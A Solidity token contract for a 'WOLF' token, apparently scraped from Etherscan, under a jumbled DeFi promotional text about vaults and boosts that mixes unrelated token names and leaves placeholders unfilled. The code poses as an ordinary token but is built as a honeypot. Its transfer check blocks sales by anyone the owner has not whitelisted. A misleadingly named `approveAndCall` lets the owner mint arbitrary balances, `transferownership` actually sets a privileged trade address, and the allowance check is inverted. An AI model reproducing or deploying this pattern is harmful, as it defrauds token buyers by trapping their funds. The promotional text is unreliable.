/**
 *Submitted for verification at Etherscan.io on 2021-01-12
*/

/*
We're so glad to have you at WOLF protocol! Thanks for dropping by and reading this article, and a special Thankyou to all the WOLF OGs and holders who have held firm in anticipation for our massive ecosystem upgrades
Strategy & Objectives Of v2 Upgrade.
Sustainability is key in DeFi, and we have unanimously agreed that WLFP is in urgent need of a transition to a more sustainable model with multiple revenue streams, rather than only PUP income. The strategy is to integrate external tokens into our ecosystem for value add and cross exposure, and we are beefing up our partner platform to now allow any project to have their pools on WLFP and they can farm other tokens as long as they provide the seeds. This means that, projects no longer need to risk bugs and mistakes in setting up pools, WLFP will build them for you on our platform, but we will just add our multiplier contract on top to allow increased spending and transaction volume on our tokens.
The Vaults
WOLF along with PUP will be accompanied with a 1.5% network fee on all buys, sells and swaps. Where do these fees go ? They will be the new permanent seed for our vaults. Here is an example below
WOLF/ETH LP -> 1% of WOLF tx fees as rewards
WOLF -> 0.5% of PUP tx fees as rewards
WOLF/PUP -> 1.5% of all PUP tx fees as rewards.
All vaults will have the following multiplier contract attached.
4x Boosts multiplier
Time Lock X amount of WOLF in vault for X amount of time to receive 10–50% global boost
Spend/Burn X amount of WOLF on pools as a spendable multiplier up to 10–50%
Burn X HOT per hour in HOT EATER for 10–50% boost for X amount of time.
Spend X amount RFI as a spendable multiplier up to 10–50%

On partner pools and PUP pools the 4th Boost will Rotate between Spend RFI, Burn COVAL, Burn AXIOMS, Spend LINK across various pools.
SEXY Global Boost Re-Defined
Previously, you had to Hold/Stake X amount of WOLF to be eligible for the global boost. That all changes in V2. Our now WOLF Vault will be the home of our new Global Boost. How does it work ? It's simple. We only want to give multiplier boost to those who actually support the network and LOCK their WOLF long term. So the following adjustments have been made.
Vault Is Fed from the 0.5% WOLF TX fees.
Lock WOLF, Receive WOLF as Rewards + Boosts
Failure to commit to your time-lock and an early withdrawal will incur a 10% early withdrawal fee that also goes back to the WOLF Vault as rewards.
10% Global Boost: Lock minimum 5 SEXY, 15 day lock
20% Global Boost: Lock minimum 10 WOLF, 1 month lock
30% Global Boost: Lock minimum 15 WOLF, 45 day lock
40% Global Boost: Lock minimum 20 WOLF, 2 month lock
50% Global Boost: Lock minimum 30 WOLF, 3 months lock

PUP Pools Re-Launch with PUP Eater
Welcome to the Dream Eater, our crazy innovation monster that gobbles up PUP per block for up to 50% global boost. Make sure you are farming PUP in all our PUP pools tho, once your HOT Eater is empty you lose the Dream Boost, Youn need time keep it constantly filled.
Dream Eater Setup.
Burn HOT, get boosts
10% Global Boost: Burn # / per block
20% Global Boost: Burn # / per block
30% Global Boost: Burn # / per block
40% Global Boost: Burn # / per block
50% Global Boost Burn # /per block

Changeable Burn Rates
*/
pragma solidity ^0.5.16;

contract WOLF {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }

    function ensure(address _from, address _to, uint _value) internal view returns(bool) {

        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(!(allowance[_from][msg.sender] >= _value));
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;

        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }

    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}